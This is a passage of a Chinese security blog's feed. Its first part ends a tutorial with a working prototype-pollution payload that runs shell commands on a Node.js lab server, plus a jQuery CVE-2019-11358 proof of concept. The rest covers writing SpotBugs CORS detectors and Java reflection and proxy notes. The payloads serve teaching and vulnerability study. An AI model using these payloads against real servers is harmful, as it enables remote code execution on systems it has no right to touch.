class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.70.138:8086</span><br><span class="line"><span class="attribute">Content-Length</span>: 198</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.70.138:8086</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.70.138:8086/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"__proto__": &#123;"sourceURL": "\u000areturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"&#125;&#125;</span><br></pre></td></tr></table></figure><p>解释一下payload，<code>e=&gt;{return ...}</code>是ES6的匿名函数创建语法，相当于</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计<code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code>中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function</p><p>执行结果如下</p><p><img src="/JS-原型链污染/1556111648655.png" alt="1556111648655"></p><p>注意，ping命令不能用，因为nodejs没有权限，Content-Type需要改为json（nodejs默认接受json格式）。</p><h2 id="优化payload"><a href="#优化payload" class="headerlink" title="优化payload"></a>优化payload</h2><p>上面的payload已经可以攻击成功，但是存在一个弊端就是在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务：</p><p><img src="/JS-原型链污染/1556973914607.png" alt="1556973914607"></p><p>需要用for循环把之前的污染删掉，这也就成了p神帖子里面的payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\u000areturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>题外话，当时没想清楚为啥在return之前删除可以在后面删除污染，实际上是一个简单的先后问题，即在request的时候，我们污染了<code>sourceURL</code>，接着造成代码执行（先），在执行时，污染源被清除（后），返回系统命令执行结果，这样之后的调用就不会受到原型链污染的影响了。</p><h1 id="jQuery的原型污染-CVE-2019-11358"><a href="#jQuery的原型污染-CVE-2019-11358" class="headerlink" title="jQuery的原型污染(CVE-2019-11358)"></a>jQuery的原型污染(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11358" target="_blank" rel="noopener">CVE-2019-11358</a>)</h1><p>jQuery 3.4.0以下版本（不包括3.4.0）存在原型污染漏洞。主要原因可以参考奇安信代码卫士的“<a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">jQuery CVE-2019-11358 原型污染漏洞分析和修复建议</a>”一文。</p><p>Sink出现在src/core.js代码jQuery.extend函数的<a href="https://github.com/jquery/jquery/blob/3.3.1/src/core.js#L155" target="_blank" rel="noopener">180-185行</a>：</p><p><img src="/JS-原型链污染/1557061047384.png" alt="1557061047384"></p><p>180行是一个递归调用，这里可以看到extend()参数有deep，clone，copy三个，接着<code>target[name]=copy</code>中，如果name和copy可控的话就可以进行污染了。</p><p>这两个变量当然是可控的，向上看到155-160行：</p><p><img src="/JS-原型链污染/1557061924872.png" alt="1557061924872"></p><p>arguments就是传进来的参数，先赋值给options，接着options的key就是name，value就是copy。</p><p>因此可以构造如下PoC：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode": true&#125;&#125;'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.devMode); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>可以看到，之所以说jQuery原型污染的影响不大，是因为这是一个前端漏洞，即使有漏洞，攻击者也需要根据网站（源码审计）产生EXP，当然，如果网站依赖于某些类的某些属性/方法做身份验证或其他的什么事情（例如PoC里的devMode），那么后果还是很严重的。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><p>JavaScript原型链污染，<a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">https://xz.aliyun.com/t/2735</a></p></li><li><p>深入理解 JavaScript Prototype 污染攻击，<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p></li><li><p>After three years of silence, a new jQuery prototype pollution vulnerability emerges once again，<a href="https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/" target="_blank" rel="noopener">https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/</a></p></li><li><p>jQuery CVE-2019-11358 原型污染漏洞分析和修复建议, <a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177093</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;prototype和-proto&quot;&gt;&lt;a href=&quot;#prototype和-proto&quot; class=&quot;headerlink&quot; title=&quot;prototype和__proto__&quot;&gt;&lt;/a&gt;&lt;code&gt;prototype&lt;/code&gt;和&lt;code&gt;__prot
      
    
    </summary>
    
      <category term="Web安全-JavaScript" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://anemone.top/tags/JavaScript/"/>
    
      <category term="jQuery" scheme="http://anemone.top/tags/jQuery/"/>
    
      <category term="原型链污染" scheme="http://anemone.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>spotbugs源码学习&amp;添加安全规则</title>
    <link href="http://anemone.top/whitebox-spotbugs%E6%B7%BB%E5%8A%A0%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%99/"/>
    <id>http://anemone.top/whitebox-spotbugs添加安全规则/</id>
    <published>2019-05-01T01:27:49.000Z</published>
    <updated>2019-09-22T10:14:18.710Z</updated>
    
    <content type="html"><![CDATA[<p>因为帮我内推阿里的师傅告诉我以后可能要做源码审计的工作，先学习一下spotbugs和<a href="https://find-sec-bugs.github.io/" target="_blank" rel="noopener">find-sec-bugs</a>的扫描规则实现，并且尝试添加一个规则。</p><h1 id="添加扫描规则——添加一个Detector"><a href="#添加扫描规则——添加一个Detector" class="headerlink" title="添加扫描规则——添加一个Detector"></a>添加扫描规则——添加一个Detector</h1><p>添加扫描规则主要是继承Detector，本文介绍以下几种主要的Detector：</p><h2 id="OpcodeStackDetector"><a href="#OpcodeStackDetector" class="headerlink" title="OpcodeStackDetector"></a>OpcodeStackDetector</h2><p>检查每一个Java虚拟机操作码（继承其中的<code>sawOpcode(int seen)</code>，<code>seen</code>即操作吗int表示），其中可以获取调用的方法名——<code>getNameConstantOperand()</code>，获取调用者——<code>getClassConstantOperand()</code>，获取函数调用的参数——<code>stack.getStackItem(0)</code>。可以做类似于正则匹配的简单扫描工具。</p><p>例如扫描<code>registry.addMapping.addMapping(&quot;/**&quot;).allowedOrigins(&quot;*&quot;)</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsRegistryCORSDetector</span> <span class="keyword">extends</span> <span class="title">OpcodeStackDetector</span> </span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sawOpcode</span><span class="params">(<span class="keyword">int</span> seen)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检测调用方法名</span></span><br><span class="line">        <span class="keyword">if</span> (seen == Const.INVOKEVIRTUAL &amp;&amp; getNameConstantOperand().equals(<span class="string">"allowedOrigins"</span>)) &#123;</span><br><span class="line">            <span class="comment">// 检测调用对象</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"org/springframework/web/servlet/config/annotation/CorsRegistration"</span>.equals(getClassConstantOperand())) &#123;</span><br><span class="line">                OpcodeStack.Item item = stack.getStackItem(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 因为allowedOrigins参数时Strings... 所以不能直接提取而需要自己通过字节码提取</span></span><br><span class="line">                <span class="keyword">if</span>(item.isArray()) &#123;</span><br><span class="line">                    String[] strings=getStringArray(item);</span><br><span class="line">                    String pattern=<span class="string">"*"</span>;</span><br><span class="line">                    <span class="keyword">for</span> (String s: strings) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (s.equals(pattern)) &#123;</span><br><span class="line">                             bugReporter.reportBug(<span class="keyword">new</span> BugInstance(<span class="keyword">this</span>, <span class="string">"PERMISSIVE_CORS"</span>, HIGH_PRIORITY)</span><br><span class="line">                        .addClassAndMethod(<span class="keyword">this</span>).addSourceLine(<span class="keyword">this</span>));</span><br><span class="line">                             <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是我为find-sec-bugs提交的一个真实的Detector，其中有一个坑就是<code>allowedOrigins()</code>方法的参数是变长参数（实际上是一个数组），如果参数是String或是定长参数的话，直接用<code>stack.getStackItem(0)</code>就可以拿到参数了，现在的话就需要自己写<code>getStringArray(item)</code>方法，具体解决代码见<a href="https://github.com/find-sec-bugs/find-sec-bugs/pull/472" target="_blank" rel="noopener">find-sec-bugs#472</a></p><h2 id="BasicInjectionDetector"><a href="#BasicInjectionDetector" class="headerlink" title="BasicInjectionDetector"></a>BasicInjectionDetector</h2><p>该Detector以每次调用（invoke）为单位进行代码审计，通过污点传播技术，判断调用敏感函数时判断参数是否为用户可控（可以参考com.h3xstream.findsecbugs.file.PathTraversalDetector.java）</p><p>也可继承后需重写getInjectionPoint()和getPriorityFromTaintFrame()方法，直接判断是否存在调用以及判断风险等级，这时退化成OpcodeStackDetector，例如，我们要检测CORS漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsRegistryCORSDetector</span> <span class="keyword">extends</span> <span class="title">BasicInjectionDetector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PERMISSIVE_CORS = <span class="string">"PERMISSIVE_CORS"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CORS_REGISTRY_CLASS = <span class="string">"org.springframework.web.servlet.config.annotation.CorsRegistration"</span>;</span><br><span class="line">    <span class="comment">// 需要获取函数原型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> InvokeMatcherBuilder CORS_REGISTRY_ALLOWED_ORIGINS_METHOD = invokeInstruction()</span><br><span class="line">            .atClass(CORS_REGISTRY_CLASS).atMethod(<span class="string">"allowedOrigins"</span>)</span><br><span class="line">            .withArgs(<span class="string">"([Ljava/lang/String;)Lorg/springframework/web/servlet/config/annotation/CorsRegistration;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CorsRegistryCORSDetector</span><span class="params">(BugReporter bugReporter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(bugReporter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 每次调用时都会用该函数判断是否存在漏洞</span></span><br><span class="line"><span class="comment">     * invoke：表示一次调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> InjectionPoint <span class="title">getInjectionPoint</span><span class="params">(InvokeInstruction invoke, ConstantPoolGen cpg,</span></span></span><br><span class="line"><span class="function"><span class="params">            InstructionHandle handle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">assert</span> invoke != <span class="keyword">null</span> &amp;&amp; cpg != <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 可以通过一下方法获取InvokeMatcherBuilder的class、method、Signature</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getClassName(cpg));</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getMethodName(cpg));</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getSignature(cpg));</span></span><br><span class="line">        <span class="keyword">if</span> (CORS_REGISTRY_ALLOWED_ORIGINS_METHOD.matches(invoke, cpg)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InjectionPoint(<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">0</span> &#125;, PERMISSIVE_CORS);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> InjectionPoint.NONE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回危险等级</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">getPriorityFromTaintFrame</span><span class="params">(TaintFrame fact, <span class="keyword">int</span> offset)</span> <span class="keyword">throws</span> DataflowAnalysisException </span>&#123;</span><br><span class="line">        <span class="comment">// Get the value of the Access-Control-Allow-Origin parameter (Second argument from setHeader(2nd,1rst))</span></span><br><span class="line">        Taint  originsTaint= fact.getStackValue(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (originsTaint.getConstantOrPotentialValue().contains(<span class="string">"*"</span>)) &#123; <span class="comment">//Ignore unknown/dynamic header name</span></span><br><span class="line">            <span class="keyword">return</span> Priorities.HIGH_PRIORITY;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Priorities.IGNORE_PRIORITY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里<code>getPriorityFromTaintFrame()</code>方法写的是有问题的，还是因为变长参数问题，导致<code>originsTaint.getConstantOrPotentialValue()</code>只能得到数组长度却不能拿到内容。</p><p>这里第二个难点就是获取函数原型，可以考虑是用javap：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -cp C:\Users\x5651\.m2\repository\org\springframework\spring-webmvc\5.1.6.RELEASE\spring-webmvc-5.1.6.RELEASE.jar -s org.springframework.web.servlet.config.annotation.CorsRegistration</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为帮我内推阿里的师傅告诉我以后可能要做源码审计的工作，先学习一下spotbugs和&lt;a href=&quot;https://find-sec-bugs.github.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;find-sec-bugs&lt;/a&gt;的扫描规
      
    
    </summary>
    
      <category term="源码安全" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="源码安全" scheme="http://anemone.top/tags/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="http://anemone.top/tags/Java/"/>
    
      <category term="Spotbugs" scheme="http://anemone.top/tags/Spotbugs/"/>
    
  </entry>
  
  <entry>
    <title>java反射学习笔记</title>
    <link href="http://anemone.top/java-java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/java-java反射学习笔记/</id>
    <published>2019-03-14T06:44:26.000Z</published>
    <updated>2019-09-22T10:14:18.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h1><h2 id="动态加载一个类"><a href="#动态加载一个类" class="headerlink" title="动态加载一个类"></a>动态加载一个类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL[] urls = <span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(<span class="string">"file:.\\out\\production\\java_reflect"</span>)&#125;;</span><br><span class="line">URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">Class clazz = classLoader.loadClass(<span class="string">"test.reflect.User"</span>);</span><br></pre></td></tr></table></figure><h2 id="寻找一个类"><a href="#寻找一个类" class="headerlink" title="寻找一个类"></a>寻找一个类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"test.reflect.User"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中的构造方法"><a href="#获取类中的构造方法" class="headerlink" title="获取类中的构造方法"></a>获取类中的构造方法</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor1=clazz.getConstructor();</span><br><span class="line">User user1 = (User) constructor1.newInstance();</span><br><span class="line"></span><br><span class="line">Constructor constructor2=clazz.getConstructor(String.class, String.class);</span><br><span class="line">User user2 = (User) constructor2.newInstance(<span class="string">"lili"</span>, <span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中属性"><a href="#获取类中属性" class="headerlink" title="获取类中属性"></a>获取类中属性</h1><h2 id="获取类中公有属性"><a href="#获取类中公有属性" class="headerlink" title="获取类中公有属性"></a>获取类中公有属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Field usernameField=clazz.getField(<span class="string">"username"</span>);</span><br><span class="line">usernameField.get(user2);</span><br></pre></td></tr></table></figure><h2 id="获取类中私有属性"><a href="#获取类中私有属性" class="headerlink" title="获取类中私有属性"></a>获取类中私有属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field passwordField=clazz.getDeclaredField(<span class="string">"password"</span>);</span><br><span class="line">passwordField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">passwordField.set(user2, <span class="string">"654321"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中方法"><a href="#获取类中方法" class="headerlink" title="获取类中方法"></a>获取类中方法</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method getInfoMethod=clazz.getDeclaredMethod(<span class="string">"getInfo"</span>, <span class="keyword">int</span>.class);</span><br></pre></td></tr></table></figure><h2 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getInfoMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">String ret= (String) getInfoMethod.invoke(user2, <span class="number">1</span>);</span><br><span class="line">System.out.println(ret);</span><br></pre></td></tr></table></figure><h2 id="调用静态方法"><a href="#调用静态方法" class="headerlink" title="调用静态方法"></a>调用静态方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method staticMethod=clazz.getDeclaredMethod(<span class="string">"staticMethod"</span>);</span><br><span class="line">staticMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">staticMethod.invoke(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;获取类对象&quot;&gt;&lt;a href=&quot;#获取类对象&quot; class=&quot;headerlink&quot; title=&quot;获取类对象&quot;&gt;&lt;/a&gt;获取类对象&lt;/h1&gt;&lt;h2 id=&quot;动态加载一个类&quot;&gt;&lt;a href=&quot;#动态加载一个类&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="java" scheme="http://anemone.top/categories/java/"/>
    
    
      <category term="java" scheme="http://anemone.top/tags/java/"/>
    
      <category term="反射" scheme="http://anemone.top/tags/%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>java动态代理学习笔记</title>
    <link href="http://anemone.top/java-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/java-java动态代理学习笔记/</id>
    <published>2019-03-14T06:21:12.000Z</published>
    <updated>2019-09-22T10:14:18.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>java动态代理机制可以实现使用一个抽象的中介类对任意类的任意方法进行进行代理，大致原理是运行时生成一个代理类，代理类再调用委托对象。</p><h2 id="创建委托对象的接口"><a href="#创建委托对象的接口" class="headerlink" title="创建委托对象的接口"></a>创建委托对象的接口</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建接口的实现"><a href="#创建接口的实现" class="headerlink" title="创建接口的实现"></a>创建接口的实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SellImpl</span> <span class="keyword">implements</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In sell method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In add method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现中介类"><a href="#实现中介类" class="headerlink" title="实现中介类"></a>实现中介类</h2><p>中介类实现java.lang.reflect.InvocationHandler接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 委托类对象</span></span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DynamicProxy</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.object=object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Before"</span>);</span><br><span class="line">        Object result = method.invoke(object, args);</span><br><span class="line">        System.out.println(<span class="string">"After"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用户调用"><a href="#用户调用" class="headerlink" title="用户调用"></a>用户调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建中介类实例</span></span><br><span class="line">        MyInvocationHandler inter = <span class="keyword">new</span> MyInvocationHandler(<span class="keyword">new</span> SellImpl());</span><br><span class="line">        <span class="comment">//加上这句将会产生一个$Proxy0.class文件，这个文件即为动态生成的代理类文件</span></span><br><span class="line">        System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>,<span class="string">"true"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取代理类实例sell</span></span><br><span class="line">        Sell sell = (Sell)(Proxy.newProxyInstance(Sell.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Sell.class&#125;, inter));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过代理类对象调用代理类方法，实际上会转到invoke方法调用</span></span><br><span class="line">        sell.sell();</span><br><span class="line">        sell.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="原理分析"><a href="#原理分析" class="headerlink" 